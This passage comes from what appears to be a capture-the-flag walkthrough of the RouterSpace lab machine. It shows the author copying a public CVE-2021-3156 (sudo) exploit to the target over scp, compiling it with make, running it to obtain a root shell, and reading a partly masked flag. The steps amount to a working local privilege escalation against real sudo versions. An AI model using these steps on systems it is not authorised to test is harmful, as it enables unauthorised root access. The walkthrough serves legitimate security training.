Receiving objects: 100% (13/13), 4.13 KiB | 4.13 MiB/s, done.
Resolving deltas: 100% (1/1), done.

```

I’ll `scp` it to RouterSpace:

```

oxdf@hacky$ scp -ri ~/keys/ed25519_gen CVE-2021-3156/ paul@routerspace.htb:/dev/shm/
README.md                                                            100%  692     7.4KB/s   00:00    
Makefile                                                             100%  208     2.3KB/s   00:00    
exploit                                                              100%   16KB  88.2KB/s   00:00    
x.so.2                                                               100%   14KB 142.9KB/s   00:00    
description                                                          100%   73     0.7KB/s   00:00    
index                                                                100%  441     4.7KB/s   00:00
...[snip]...

```

I’ll `make` it as indicated in the `README.md`:

```

paul@routerspace:/dev/shm/CVE-2021-3156$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c

```

Now running it returns a root shell:

```

paul@routerspace:/dev/shm/CVE-2021-3156$ ./exploit 
# id
uid=0(root) gid=0(root) groups=0(root),1001(paul) 

```

And I can read `root.txt`:

```

# cat root.txt
0f39f5ce************************

```